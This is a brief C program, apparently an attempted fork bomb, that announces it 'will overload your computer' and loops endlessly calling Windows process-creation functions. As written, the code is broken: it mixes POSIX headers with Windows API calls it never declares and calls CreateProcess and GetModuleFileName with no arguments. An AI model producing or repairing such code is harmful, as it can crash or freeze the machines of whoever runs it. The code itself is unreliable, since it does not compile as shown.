#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void main(void) {
	printf("This is a program that will overload your computer\n");
	while (1) {
		GetModuleFileName();
		GetModuleHandle(NULL);
		printf("forking\n");
		CreateProcess();
	}
}
